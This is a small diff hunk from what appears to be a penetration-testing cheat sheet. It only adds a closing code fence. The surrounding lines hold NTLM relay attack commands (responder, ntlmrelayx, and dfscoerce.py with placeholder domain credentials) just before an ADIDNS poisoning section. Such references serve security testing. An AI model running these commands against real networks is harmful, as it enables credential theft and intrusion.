@@ -7440,6 +7440,7 @@ python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAA
 sudo responder -I eth0 -w
 python ntlmrelayx.py --no-smb-server -t <RHOST>
 python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'bogus@80/foobar' <RHOST>
+```
 
 ###### ADIDNS Poisoning
 
